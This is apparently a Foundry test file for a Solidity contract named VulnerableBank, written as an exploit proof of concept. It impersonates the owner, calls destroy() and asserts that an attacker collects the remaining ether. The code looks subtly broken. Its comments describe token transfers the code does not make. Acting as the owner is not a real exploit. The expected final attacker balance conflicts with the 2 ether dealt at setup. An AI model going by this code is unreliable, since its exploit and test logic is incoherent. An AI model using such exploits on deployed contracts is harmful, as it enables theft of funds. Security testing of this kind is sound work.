// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "./basetest.sol";
import "../src/VulnerableBank.sol";

contract VulnerableBankTest is BaseTestWithBalanceLog {
    VulnerableBank target;
    address attacker = makeAddr("attacker");

    function setUp() public override {
        target = new VulnerableBank();
        vm.deal(attacker, 2 ether);
    }

    function testExploit() public {
        // Step 1: Transfer tokens from the default owner to another account
        target.setBalance(attacker, 1 ether);

        // Step 2: Call the destroy function on the token contract as the default owner
        deal(address(target), 0.5 ether); // Ensure there are funds to destroy
        vm.startPrank(target.owner());
        target.destroy();
        vm.stopPrank();

        // Validation
        assertEq(target.owner(), address(0)); // The contract should be destroyed and the owner set to zero-address
        balanceLog("Attacker Balance After Exploit", attacker, 1.5 ether); // Attacker receives the remaining funds
    }
}